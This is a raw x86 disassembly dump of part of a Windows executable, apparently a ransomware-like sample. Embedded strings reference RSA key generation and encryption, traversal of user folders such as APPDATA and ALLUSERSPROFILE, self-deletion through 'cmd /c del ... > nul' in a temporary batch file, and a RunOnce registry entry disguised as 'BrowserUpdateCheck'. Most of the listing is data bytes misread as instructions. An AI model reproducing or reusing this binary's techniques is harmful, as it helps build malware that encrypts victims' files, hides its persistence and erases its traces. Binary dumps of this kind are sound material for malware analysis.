  401ba3:	00 55 03             	add    %dl,0x3(%ebp)
  401ba6:	00 00                	add    %al,(%eax)
  401ba8:	59                   	pop    %ecx
  401ba9:	03 00                	add    (%eax),%eax
  401bab:	00 5b 03             	add    %bl,0x3(%ebx)
  401bae:	00 00                	add    %al,(%eax)
  401bb0:	5f                   	pop    %edi
  401bb1:	03 00                	add    (%eax),%eax
  401bb3:	00 6d 03             	add    %ch,0x3(%ebp)
  401bb6:	00 00                	add    %al,(%eax)
  401bb8:	71 03                	jno    0x401bbd
  401bba:	00 00                	add    %al,(%eax)
  401bbc:	73 03                	jae    0x401bc1
  401bbe:	00 00                	add    %al,(%eax)
  401bc0:	77 03                	ja     0x401bc5
  401bc2:	00 00                	add    %al,(%eax)
  401bc4:	8b 03                	mov    (%ebx),%eax
  401bc6:	00 00                	add    %al,(%eax)
  401bc8:	8f 03                	pop    (%ebx)
  401bca:	00 00                	add    %al,(%eax)
  401bcc:	97                   	xchg   %eax,%edi
  401bcd:	03 00                	add    (%eax),%eax
  401bcf:	00 a1 03 00 00 a9    	add    %ah,-0x56fffffd(%ecx)
  401bd5:	03 00                	add    (%eax),%eax
  401bd7:	00 ad 03 00 00 b3    	add    %ch,-0x4cfffffd(%ebp)
  401bdd:	03 00                	add    (%eax),%eax
  401bdf:	00 b9 03 00 00 c7    	add    %bh,-0x38fffffd(%ecx)
  401be5:	03 00                	add    (%eax),%eax
  401be7:	00 cb                	add    %cl,%bl
  401be9:	03 00                	add    (%eax),%eax
  401beb:	00 d1                	add    %dl,%cl
  401bed:	03 00                	add    (%eax),%eax
  401bef:	00 d7                	add    %dl,%bh
  401bf1:	03 00                	add    (%eax),%eax
  401bf3:	00 df                	add    %bl,%bh
  401bf5:	03 00                	add    (%eax),%eax
  401bf7:	00 e5                	add    %ah,%ch
  401bf9:	03 00                	add    (%eax),%eax
  401bfb:	00 99 ff ff ff 06    	add    %bl,0x6ffffff(%ecx)
  401c01:	00 00                	add    %al,(%eax)
  401c03:	00 05 00 00 00 00    	add    %al,0x0
  401c09:	00 00                	add    %al,(%eax)
  401c0b:	00 53 48             	add    %dl,0x48(%ebx)
  401c0e:	41                   	inc    %ecx
  401c0f:	32 32                	xor    (%edx),%dh
  401c11:	34 00                	xor    $0x0,%al
  401c13:	00 53 48             	add    %dl,0x48(%ebx)
  401c16:	41                   	inc    %ecx
  401c17:	32 35 36 00 00 05    	xor    0x5000036,%dh
  401c1d:	00 00                	add    %al,(%eax)
  401c1f:	00 0c 1c             	add    %cl,(%esp,%ebx,1)
  401c22:	40                   	inc    %eax
  401c23:	00 1c 00             	add    %bl,(%eax,%eax,1)
  401c26:	00 00                	add    %al,(%eax)
  401c28:	40                   	inc    %eax
  401c29:	00 00                	add    %al,(%eax)
  401c2b:	00 78 70             	add    %bh,0x70(%eax)
  401c2e:	40                   	inc    %eax
  401c2f:	00 86 70 40 00 8b    	add    %al,-0x74ffbf90(%esi)
  401c35:	70 40                	jo     0x401c77
  401c37:	00 90 70 40 00 a6    	add    %dl,-0x59ffbf90(%eax)
  401c3d:	70 40                	jo     0x401c7f
  401c3f:	00 c2                	add    %al,%dl
  401c41:	70 40                	jo     0x401c83
  401c43:	00 d8                	add    %bl,%al
  401c45:	70 40                	jo     0x401c87
  401c47:	00 dd                	add    %bl,%ch
  401c49:	70 40                	jo     0x401c8b
  401c4b:	00 06                	add    %al,(%esi)
  401c4d:	00 00                	add    %al,(%eax)
  401c4f:	00 14 1c             	add    %dl,(%esp,%ebx,1)
  401c52:	40                   	inc    %eax
  401c53:	00 20                	add    %ah,(%eax)
  401c55:	00 00                	add    %al,(%eax)
  401c57:	00 40 00             	add    %al,0x0(%eax)
  401c5a:	00 00                	add    %al,(%eax)
  401c5c:	e2 70                	loop   0x401cce
  401c5e:	40                   	inc    %eax
  401c5f:	00 86 70 40 00 8b    	add    %al,-0x74ffbf90(%esi)
  401c65:	70 40                	jo     0x401ca7
  401c67:	00 f0                	add    %dh,%al
  401c69:	70 40                	jo     0x401cab
  401c6b:	00 a6 70 40 00 c2    	add    %ah,-0x3dffbf90(%esi)
  401c71:	70 40                	jo     0x401cb3
  401c73:	00 d8                	add    %bl,%al
  401c75:	70 40                	jo     0x401cb7
  401c77:	00 dd                	add    %bl,%ch
  401c79:	70 40                	jo     0x401cbb
  401c7b:	00 00                	add    %al,(%eax)
  401c7d:	00 00                	add    %al,(%eax)
  401c7f:	00 6c 1d 40          	add    %ch,0x40(%ebp,%ebx,1)
  401c83:	00 09                	add    %cl,(%ecx)
  401c85:	00 00                	add    %al,(%eax)
  401c87:	00 78 1d             	add    %bh,0x1d(%eax)
  401c8a:	40                   	inc    %eax
  401c8b:	00 90 1d 40 00 05    	add    %dl,0x500401d(%eax)
  401c91:	00 00                	add    %al,(%eax)
  401c93:	00 01                	add    %al,(%ecx)
  401c95:	00 00                	add    %al,(%eax)
  401c97:	00 a4 1d 40 00 09 00 	add    %ah,0x90040(%ebp,%ebx,1)
  401c9e:	00 00                	add    %al,(%eax)
  401ca0:	b0 1d                	mov    $0x1d,%al
  401ca2:	40                   	inc    %eax
  401ca3:	00 c8                	add    %cl,%al
  401ca5:	1d 40 00 06 00       	sbb    $0x60040,%eax
  401caa:	00 00                	add    %al,(%eax)
  401cac:	01 00                	add    %eax,(%eax)
  401cae:	00 00                	add    %al,(%eax)
  401cb0:	dc 1d 40 00 09 00    	fcompl 0x90040
  401cb6:	00 00                	add    %al,(%eax)
  401cb8:	e8 1d 40 00 e8       	call   0xe8405cda
  401cbd:	1d 40 00 00 00       	sbb    $0x40,%eax
  401cc2:	00 00                	add    %al,(%eax)
  401cc4:	06                   	push   %es
	...
  401cdd:	00 00                	add    %al,(%eax)
  401cdf:	00 f4                	add    %dh,%ah
  401ce1:	1d 40 00 09 00       	sbb    $0x90040,%eax
  401ce6:	00 00                	add    %al,(%eax)
  401ce8:	00 1e                	add    %bl,(%esi)
  401cea:	40                   	inc    %eax
  401ceb:	00 10                	add    %dl,(%eax)
  401ced:	1e                   	push   %ds
  401cee:	40                   	inc    %eax
  401cef:	00 01                	add    %al,(%ecx)
  401cf1:	00 00                	add    %al,(%eax)
  401cf3:	00 14 1e             	add    %dl,(%esi,%ebx,1)
  401cf6:	40                   	inc    %eax
  401cf7:	00 07                	add    %al,(%edi)
  401cf9:	00 00                	add    %al,(%eax)
  401cfb:	00 1c 1e             	add    %bl,(%esi,%ebx,1)
  401cfe:	40                   	inc    %eax
  401cff:	00 2c 1e             	add    %ch,(%esi,%ebx,1)
  401d02:	40                   	inc    %eax
  401d03:	00 02                	add    %al,(%edx)
  401d05:	00 00                	add    %al,(%eax)
  401d07:	00 3c 1e             	add    %bh,(%esi,%ebx,1)
  401d0a:	40                   	inc    %eax
  401d0b:	00 05 00 00 00 44    	add    %al,0x44000000
  401d11:	1e                   	push   %ds
  401d12:	40                   	inc    %eax
  401d13:	00 4c 1e 40          	add    %cl,0x40(%esi,%ebx,1)
  401d17:	00 03                	add    %al,(%ebx)
	...
  401d2d:	00 00                	add    %al,(%eax)
  401d2f:	00 5c 1e 40          	add    %bl,0x40(%esi,%ebx,1)
  401d33:	00 09                	add    %cl,(%ecx)
  401d35:	00 00                	add    %al,(%eax)
  401d37:	00 68 1e             	add    %ch,0x1e(%eax)
  401d3a:	40                   	inc    %eax
  401d3b:	00 74 1e 40          	add    %dh,0x40(%esi,%ebx,1)
  401d3f:	00 05 00 00 00 7c    	add    %al,0x7c000000
  401d45:	1e                   	push   %ds
  401d46:	40                   	inc    %eax
  401d47:	00 09                	add    %cl,(%ecx)
  401d49:	00 00                	add    %al,(%eax)
  401d4b:	00 88 1e 40 00 94    	add    %cl,-0x6bffbfe2(%eax)
  401d51:	1e                   	push   %ds
  401d52:	40                   	inc    %eax
  401d53:	00 06                	add    %al,(%esi)
	...
  401d69:	00 00                	add    %al,(%eax)
  401d6b:	00 2a                	add    %ch,(%edx)
  401d6d:	86 48 86             	xchg   %cl,-0x7a(%eax)
  401d70:	f7 0d 01 01 0e 00 00 	testl  $0x68730000,0xe0101
  401d77:	00 73 68 
  401d7a:	61                   	popa
  401d7b:	32 32                	xor    (%edx),%dh
  401d7d:	34 57                	xor    $0x57,%al
  401d7f:	69 74 68 52 53 41 45 	imul   $0x6e454153,0x52(%eax,%ebp,2),%esi
  401d86:	6e 
  401d87:	63 72 79             	arpl   %esi,0x79(%edx)
  401d8a:	70 74                	jo     0x401e00
  401d8c:	69 6f 6e 00 52 53 41 	imul   $0x41535200,0x6e(%edi),%ebp
  401d93:	20 77 69             	and    %dh,0x69(%edi)
  401d96:	74 68                	je     0x401e00
  401d98:	20 53 48             	and    %dl,0x48(%ebx)
  401d9b:	41                   	inc    %ecx
  401d9c:	2d 32 32 34 00       	sub    $0x343232,%eax
  401da1:	00 00                	add    %al,(%eax)
  401da3:	00 2a                	add    %ch,(%edx)
  401da5:	86 48 86             	xchg   %cl,-0x7a(%eax)
  401da8:	f7 0d 01 01 0b 00 00 	testl  $0x68730000,0xb0101
  401daf:	00 73 68 
  401db2:	61                   	popa
  401db3:	32 35 36 57 69 74    	xor    0x74695736,%dh
  401db9:	68 52 53 41 45       	push   $0x45415352
  401dbe:	6e                   	outsb  %ds:(%esi),(%dx)
  401dbf:	63 72 79             	arpl   %esi,0x79(%edx)
  401dc2:	70 74                	jo     0x401e38
  401dc4:	69 6f 6e 00 52 53 41 	imul   $0x41535200,0x6e(%edi),%ebp
  401dcb:	20 77 69             	and    %dh,0x69(%edi)
  401dce:	74 68                	je     0x401e38
  401dd0:	20 53 48             	and    %dl,0x48(%ebx)
  401dd3:	41                   	inc    %ecx
  401dd4:	2d 32 35 36 00       	sub    $0x363532,%eax
  401dd9:	00 00                	add    %al,(%eax)
  401ddb:	00 2a                	add    %ch,(%edx)
  401ddd:	86 48 86             	xchg   %cl,-0x7a(%eax)
  401de0:	f7 0d 01 01 0a 00 00 	testl  $0x53520000,0xa0101
  401de7:	00 52 53 
  401dea:	41                   	inc    %ecx
  401deb:	53                   	push   %ebx
  401dec:	53                   	push   %ebx
  401ded:	41                   	inc    %ecx
  401dee:	2d 50 53 53 00       	sub    $0x535350,%eax
  401df3:	00 2a                	add    %ch,(%edx)
  401df5:	86 48 86             	xchg   %cl,-0x7a(%eax)
  401df8:	f7 0d 01 01 01 00 00 	testl  $0x73720000,0x10101
  401dff:	00 72 73 
  401e02:	61                   	popa
  401e03:	45                   	inc    %ebp
  401e04:	6e                   	outsb  %ds:(%esi),(%dx)
  401e05:	63 72 79             	arpl   %esi,0x79(%edx)
  401e08:	70 74                	jo     0x401e7e
  401e0a:	69 6f 6e 00 00 00 52 	imul   $0x52000000,0x6e(%edi),%ebp
  401e11:	53                   	push   %ebx
  401e12:	41                   	inc    %ecx
  401e13:	00 2a                	add    %ch,(%edx)
  401e15:	86 48 ce             	xchg   %cl,-0x32(%eax)
  401e18:	3d 02 01 00 69       	cmp    $0x69000102,%eax
  401e1d:	64 2d 65 63 50 75    	fs sub $0x75506365,%eax
  401e23:	62 6c 69 63          	bound  %ebp,0x63(%ecx,%ebp,2)
  401e27:	4b                   	dec    %ebx
  401e28:	65 79 00             	gs jns 0x401e2b
  401e2b:	00 47 65             	add    %al,0x65(%edi)
  401e2e:	6e                   	outsb  %ds:(%esi),(%dx)
  401e2f:	65 72 69             	gs jb  0x401e9b
  401e32:	63 20                	arpl   %esp,(%eax)
  401e34:	45                   	inc    %ebp
  401e35:	43                   	inc    %ebx
  401e36:	20 6b 65             	and    %ch,0x65(%ebx)
  401e39:	79 00                	jns    0x401e3b
  401e3b:	00 2b                	add    %ch,(%ebx)
  401e3d:	81 04 01 0c 00 00 00 	addl   $0xc,(%ecx,%eax,1)
  401e44:	69 64 2d 65 63 44 48 	imul   $0x484463,0x65(%ebp,%ebp,1),%esp
  401e4b:	00 
  401e4c:	45                   	inc    %ebp
  401e4d:	43                   	inc    %ebx
  401e4e:	20 6b 65             	and    %ch,0x65(%ebx)
  401e51:	79 20                	jns    0x401e73
  401e53:	66 6f                	outsw  %ds:(%esi),(%dx)
  401e55:	72 20                	jb     0x401e77
  401e57:	45                   	inc    %ebp
  401e58:	43                   	inc    %ebx
  401e59:	44                   	inc    %esp
  401e5a:	48                   	dec    %eax
  401e5b:	00 60 86             	add    %ah,-0x7a(%eax)
  401e5e:	48                   	dec    %eax
  401e5f:	01 65 03             	add    %esp,0x3(%ebp)
  401e62:	04 02                	add    $0x2,%al
  401e64:	04 00                	add    $0x0,%al
  401e66:	00 00                	add    %al,(%eax)
  401e68:	69 64 2d 73 68 61 32 	imul   $0x32326168,0x73(%ebp,%ebp,1),%esp
  401e6f:	32 
  401e70:	34 00                	xor    $0x0,%al
  401e72:	00 00                	add    %al,(%eax)
  401e74:	53                   	push   %ebx
  401e75:	48                   	dec    %eax
  401e76:	41                   	inc    %ecx
  401e77:	2d 32 32 34 00       	sub    $0x343232,%eax
  401e7c:	60                   	pusha
  401e7d:	86 48 01             	xchg   %cl,0x1(%eax)
  401e80:	65 03 04 02          	add    %gs:(%edx,%eax,1),%eax
  401e84:	01 00                	add    %eax,(%eax)
  401e86:	00 00                	add    %al,(%eax)
  401e88:	69 64 2d 73 68 61 32 	imul   $0x35326168,0x73(%ebp,%ebp,1),%esp
  401e8f:	35 
  401e90:	36 00 00             	add    %al,%ss:(%eax)
  401e93:	00 53 48             	add    %dl,0x48(%ebx)
  401e96:	41                   	inc    %ecx
  401e97:	2d 32 35 36 00       	sub    $0x363532,%eax
  401e9c:	25 64 2e 25 64       	and    $0x64252e64,%eax
  401ea1:	00 00                	add    %al,(%eax)
  401ea3:	00 2e                	add    %ch,(%esi)
  401ea5:	25 64 00 98 2f       	and    $0x2f980064,%eax
  401eaa:	8a 42 91             	mov    -0x6f(%edx),%al
  401ead:	44                   	inc    %esp
  401eae:	37                   	aaa
  401eaf:	71 cf                	jno    0x401e80
  401eb1:	fb                   	sti
  401eb2:	c0 b5 a5 db b5 e9 5b 	shlb   $0x5b,-0x164a245b(%ebp)
  401eb9:	c2 56 39             	ret    $0x3956
  401ebc:	f1                   	int1
  401ebd:	11 f1                	adc    %esi,%ecx
  401ebf:	59                   	pop    %ecx
  401ec0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401ec1:	82 3f 92             	cmpb   $0x92,(%edi)
  401ec4:	d5 5e                	aad    $0x5e
  401ec6:	1c ab                	sbb    $0xab,%al
  401ec8:	98                   	cwtl
  401ec9:	aa                   	stos   %al,%es:(%edi)
  401eca:	07                   	pop    %es
  401ecb:	d8 01                	fadds  (%ecx)
  401ecd:	5b                   	pop    %ebx
  401ece:	83 12 be             	adcl   $0xffffffbe,(%edx)
  401ed1:	85 31                	test   %esi,(%ecx)
  401ed3:	24 c3                	and    $0xc3,%al
  401ed5:	7d 0c                	jge    0x401ee3
  401ed7:	55                   	push   %ebp
  401ed8:	74 5d                	je     0x401f37
  401eda:	be 72 fe b1 de       	mov    $0xdeb1fe72,%esi
  401edf:	80 a7 06 dc 9b 74 f1 	andb   $0xf1,0x749bdc06(%edi)
  401ee6:	9b                   	fwait
  401ee7:	c1 c1 69             	rol    $0x69,%ecx
  401eea:	9b                   	fwait
  401eeb:	e4 86                	in     $0x86,%al
  401eed:	47                   	inc    %edi
  401eee:	be ef c6 9d c1       	mov    $0xc19dc6ef,%esi
  401ef3:	0f cc                	bswap  %esp
  401ef5:	a1 0c 24 6f 2c       	mov    0x2c6f240c,%eax
  401efa:	e9 2d aa 84 74       	jmp    0x74c4c92c
  401eff:	4a                   	dec    %edx
  401f00:	dc a9 b0 5c da 88    	fsubrl -0x7725a350(%ecx)
  401f06:	f9                   	stc
  401f07:	76 52                	jbe    0x401f5b
  401f09:	51                   	push   %ecx
  401f0a:	3e 98                	ds cwtl
  401f0c:	6d                   	insl   (%dx),%es:(%edi)
  401f0d:	c6                   	(bad)
  401f0e:	31 a8 c8 27 03 b0    	xor    %ebp,-0x4ffcd838(%eax)
  401f14:	c7                   	(bad)
  401f15:	7f 59                	jg     0x401f70
  401f17:	bf f3 0b e0 c6       	mov    $0xc6e00bf3,%edi
  401f1c:	47                   	inc    %edi
  401f1d:	91                   	xchg   %eax,%ecx
  401f1e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401f1f:	d5 51                	aad    $0x51
  401f21:	63 ca                	arpl   %ecx,%edx
  401f23:	06                   	push   %es
  401f24:	67 29 29             	sub    %ebp,(%bx,%di)
  401f27:	14 85                	adc    $0x85,%al
  401f29:	0a b7 27 38 21 1b    	or     0x1b213827(%edi),%dh
  401f2f:	2e fc                	cs cld
  401f31:	6d                   	insl   (%dx),%es:(%edi)
  401f32:	2c 4d                	sub    $0x4d,%al
  401f34:	13 0d 38 53 54 73    	adc    0x73545338,%ecx
  401f3a:	0a 65 bb             	or     -0x45(%ebp),%ah
  401f3d:	0a 6a 76             	or     0x76(%edx),%ch
  401f40:	2e c9                	cs leave
  401f42:	c2 81 85             	ret    $0x8581
  401f45:	2c 72                	sub    $0x72,%al
  401f47:	92                   	xchg   %eax,%edx
  401f48:	a1 e8 bf a2 4b       	mov    0x4ba2bfe8,%eax
  401f4d:	66 1a a8 70 8b 4b c2 	data16 sbb -0x3db47490(%eax),%ch
  401f54:	a3 51 6c c7 19       	mov    %eax,0x19c76c51
  401f59:	e8 92 d1 24 06       	call   0x664f0f0
  401f5e:	99                   	cltd
  401f5f:	d6                   	salc
  401f60:	85 35 0e f4 70 a0    	test   %esi,0xa070f40e
  401f66:	6a 10                	push   $0x10
  401f68:	16                   	push   %ss
  401f69:	c1 a4 19 08 6c 37 1e 	shll   $0x4c,0x1e376c08(%ecx,%ebx,1)
  401f70:	4c 
  401f71:	77 48                	ja     0x401fbb
  401f73:	27                   	daa
  401f74:	b5 bc                	mov    $0xbc,%ch
  401f76:	b0 34                	mov    $0x34,%al
  401f78:	b3 0c                	mov    $0xc,%bl
  401f7a:	1c 39                	sbb    $0x39,%al
  401f7c:	4a                   	dec    %edx
  401f7d:	aa                   	stos   %al,%es:(%edi)
  401f7e:	d8 4e 4f             	fmuls  0x4f(%esi)
  401f81:	ca 9c 5b             	lret   $0x5b9c
  401f84:	f3 6f                	rep outsl %ds:(%esi),(%dx)
  401f86:	2e 68 ee 82 8f 74    	cs push $0x748f82ee
  401f8c:	6f                   	outsl  %ds:(%esi),(%dx)
  401f8d:	63 a5 78 14 78 c8    	arpl   %esp,-0x3787eb88(%ebp)
  401f93:	84 08                	test   %cl,(%eax)
  401f95:	02 c7                	add    %bh,%al
  401f97:	8c fa                	mov    %?,%edx
  401f99:	ff                   	(bad)
  401f9a:	be 90 eb 6c 50       	mov    $0x506ceb90,%esi
  401f9f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401fa0:	f7 a3 f9 be f2 78    	mull   0x78f2bef9(%ebx)
  401fa6:	71 c6                	jno    0x401f6e
  401fa8:	80 00 00             	addb   $0x0,(%eax)
	...
  401fe7:	00 30                	add    %dh,(%eax)
  401fe9:	31 30                	xor    %esi,(%eax)
  401feb:	30 30                	xor    %dh,(%eax)
  401fed:	31 00                	xor    %eax,(%eax)
  401fef:	00 4c 19 40          	add    %cl,0x40(%ecx,%ebx,1)
  401ff3:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  401ff7:	00 70 00             	add    %dh,0x0(%eax)
  401ffa:	00 00                	add    %al,(%eax)
  401ffc:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  402000:	61                   	popa
  402001:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 43 00             	add    %al,0x0(%ebx)
  40200a:	4f                   	dec    %edi
  40200b:	00 4d 00             	add    %cl,0x0(%ebp)
  40200e:	53                   	push   %ebx
  40200f:	00 50 00             	add    %dl,0x0(%eax)
  402012:	45                   	inc    %ebp
  402013:	00 43 00             	add    %al,0x0(%ebx)
  402016:	00 00                	add    %al,(%eax)
  402018:	2f                   	das
  402019:	00 63 00             	add    %ah,0x0(%ebx)
  40201c:	20 00                	and    %al,(%eax)
  40201e:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  402022:	6c                   	insb   (%dx),%es:(%edi)
  402023:	00 20                	add    %ah,(%eax)
  402025:	00 00                	add    %al,(%eax)
  402027:	00 20                	add    %ah,(%eax)
  402029:	00 3e                	add    %bh,(%esi)
  40202b:	00 20                	add    %ah,(%eax)
  40202d:	00 6e 00             	add    %ch,0x0(%esi)
  402030:	75 00                	jne    0x402032
  402032:	6c                   	insb   (%dx),%es:(%edi)
  402033:	00 00                	add    %al,(%eax)
  402035:	00 00                	add    %al,(%eax)
  402037:	00 4f 00             	add    %cl,0x0(%edi)
  40203a:	70 00                	jo     0x40203c
  40203c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
	...
  402048:	53                   	push   %ebx
  402049:	00 6f 00             	add    %ch,0x0(%edi)
  40204c:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  402051:	00 61 00             	add    %ah,0x0(%ecx)
  402054:	72 00                	jb     0x402056
  402056:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  40205b:	00 69 00             	add    %ch,0x0(%ecx)
  40205e:	63 00                	arpl   %eax,(%eax)
  402060:	72 00                	jb     0x402062
  402062:	6f                   	outsl  %ds:(%esi),(%dx)
  402063:	00 73 00             	add    %dh,0x0(%ebx)
  402066:	6f                   	outsl  %ds:(%esi),(%dx)
  402067:	00 66 00             	add    %ah,0x0(%esi)
  40206a:	74 00                	je     0x40206c
  40206c:	5c                   	pop    %esp
  40206d:	00 57 00             	add    %dl,0x0(%edi)
  402070:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  402076:	6f                   	outsl  %ds:(%esi),(%dx)
  402077:	00 77 00             	add    %dh,0x0(%edi)
  40207a:	73 00                	jae    0x40207c
  40207c:	5c                   	pop    %esp
  40207d:	00 43 00             	add    %al,0x0(%ebx)
  402080:	75 00                	jne    0x402082
  402082:	72 00                	jb     0x402084
  402084:	72 00                	jb     0x402086
  402086:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40208a:	74 00                	je     0x40208c
  40208c:	56                   	push   %esi
  40208d:	00 65 00             	add    %ah,0x0(%ebp)
  402090:	72 00                	jb     0x402092
  402092:	73 00                	jae    0x402094
  402094:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40209a:	5c                   	pop    %esp
  40209b:	00 52 00             	add    %dl,0x0(%edx)
  40209e:	75 00                	jne    0x4020a0
  4020a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4020a1:	00 4f 00             	add    %cl,0x0(%edi)
  4020a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4020a5:	00 63 00             	add    %ah,0x0(%ebx)
  4020a8:	65 00 00             	add    %al,%gs:(%eax)
  4020ab:	00 42 00             	add    %al,0x0(%edx)
  4020ae:	72 00                	jb     0x4020b0
  4020b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4020b1:	00 77 00             	add    %dh,0x0(%edi)
  4020b4:	73 00                	jae    0x4020b6
  4020b6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4020ba:	55                   	push   %ebp
  4020bb:	00 70 00             	add    %dh,0x0(%eax)
  4020be:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4020c2:	74 00                	je     0x4020c4
  4020c4:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  4020c8:	68 00 65 00 63       	push   $0x63006500
  4020cd:	00 6b 00             	add    %ch,0x0(%ebx)
  4020d0:	00 00                	add    %al,(%eax)
  4020d2:	00 00                	add    %al,(%eax)
  4020d4:	2a 00                	sub    (%eax),%al
  4020d6:	00 00                	add    %al,(%eax)
  4020d8:	2e 00 00             	add    %al,%cs:(%eax)
  4020db:	00 2e                	add    %ch,(%esi)
  4020dd:	00 2e                	add    %ch,(%esi)
  4020df:	00 00                	add    %al,(%eax)
  4020e1:	00 00                	add    %al,(%eax)
  4020e3:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  4020e7:	00 2c 20             	add    %ch,(%eax,%eiz,1)
  4020ea:	00 00                	add    %al,(%eax)
  4020ec:	2c 00                	sub    $0x0,%al
  4020ee:	00 00                	add    %al,(%eax)
  4020f0:	4c                   	dec    %esp
  4020f1:	00 4f 00             	add    %cl,0x0(%edi)
  4020f4:	43                   	inc    %ebx
  4020f5:	00 41 00             	add    %al,0x0(%ecx)
  4020f8:	4c                   	dec    %esp
  4020f9:	00 41 00             	add    %al,0x0(%ecx)
  4020fc:	50                   	push   %eax
  4020fd:	00 50 00             	add    %dl,0x0(%eax)
  402100:	44                   	inc    %esp
  402101:	00 41 00             	add    %al,0x0(%ecx)
  402104:	54                   	push   %esp
  402105:	00 41 00             	add    %al,0x0(%ecx)
  402108:	00 00                	add    %al,(%eax)
  40210a:	00 00                	add    %al,(%eax)
  40210c:	41                   	inc    %ecx
  40210d:	00 50 00             	add    %dl,0x0(%eax)
  402110:	50                   	push   %eax
  402111:	00 44 00 41          	add    %al,0x41(%eax,%eax,1)
  402115:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  402119:	00 00                	add    %al,(%eax)
  40211b:	00 70 00             	add    %dh,0x0(%eax)
  40211e:	75 00                	jne    0x402120
  402120:	62 00                	bound  %eax,(%eax)
  402122:	6c                   	insb   (%dx),%es:(%edi)
  402123:	00 69 00             	add    %ch,0x0(%ecx)
  402126:	63 00                	arpl   %eax,(%eax)
  402128:	00 00                	add    %al,(%eax)
  40212a:	00 00                	add    %al,(%eax)
  40212c:	41                   	inc    %ecx
  40212d:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  402131:	00 55 00             	add    %dl,0x0(%ebp)
  402134:	53                   	push   %ebx
  402135:	00 45 00             	add    %al,0x0(%ebp)
  402138:	52                   	push   %edx
  402139:	00 53 00             	add    %dl,0x0(%ebx)
  40213c:	50                   	push   %eax
  40213d:	00 52 00             	add    %dl,0x0(%edx)
  402140:	4f                   	dec    %edi
  402141:	00 46 00             	add    %al,0x0(%esi)
  402144:	49                   	dec    %ecx
  402145:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 4c 19 40          	add    %cl,0x40(%ecx,%ebx,1)
  40214f:	00 72 73             	add    %dh,0x73(%edx)
  402152:	61                   	popa
  402153:	5f                   	pop    %edi
  402154:	65 6e                	outsb  %gs:(%esi),(%dx)
  402156:	63 72 79             	arpl   %esi,0x79(%edx)
  402159:	70 74                	jo     0x4021cf
  40215b:	00 72 73             	add    %dh,0x73(%edx)
  40215e:	61                   	popa
  40215f:	5f                   	pop    %edi
  402160:	67 65 6e             	outsb  %gs:(%si),(%dx)
  402163:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  402167:	00 68 bc             	add    %ch,-0x44(%eax)
  40216a:	21 40 00             	and    %eax,0x0(%eax)
  40216d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402173:	50                   	push   %eax
  402174:	8b 44 24 10          	mov    0x10(%esp),%eax
  402178:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40217c:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  402180:	2b e0                	sub    %eax,%esp
  402182:	53                   	push   %ebx
  402183:	56                   	push   %esi
  402184:	57                   	push   %edi
  402185:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402188:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40218b:	50                   	push   %eax
  40218c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40218f:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402196:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402199:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40219c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4021a2:	c3                   	ret
  4021a3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4021a6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4021ad:	59                   	pop    %ecx
  4021ae:	5f                   	pop    %edi
  4021af:	5e                   	pop    %esi
  4021b0:	5b                   	pop    %ebx
  4021b1:	c9                   	leave
  4021b2:	51                   	push   %ecx
  4021b3:	c3                   	ret
  4021b4:	56                   	push   %esi
  4021b5:	43                   	inc    %ebx
  4021b6:	32 30                	xor    (%eax),%dh
  4021b8:	58                   	pop    %eax
  4021b9:	43                   	inc    %ebx
  4021ba:	30 30                	xor    %dh,(%eax)
  4021bc:	55                   	push   %ebp
  4021bd:	8b ec                	mov    %esp,%ebp
  4021bf:	83 ec 08             	sub    $0x8,%esp
  4021c2:	53                   	push   %ebx
  4021c3:	56                   	push   %esi
  4021c4:	57                   	push   %edi
  4021c5:	55                   	push   %ebp
  4021c6:	fc                   	cld
  4021c7:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4021ca:	8b 45 08             	mov    0x8(%ebp),%eax
  4021cd:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  4021d4:	0f 85 ab 00 00 00    	jne    0x402285
  4021da:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021dd:	8b 45 10             	mov    0x10(%ebp),%eax
  4021e0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4021e3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4021e6:	89 43 fc             	mov    %eax,-0x4(%ebx)
  4021e9:	8b 73 0c             	mov    0xc(%ebx),%esi
  4021ec:	8b 7b 08             	mov    0x8(%ebx),%edi
  4021ef:	53                   	push   %ebx
  4021f0:	e8 e0 01 00 00       	call   0x4023d5
  4021f5:	83 c4 04             	add    $0x4,%esp
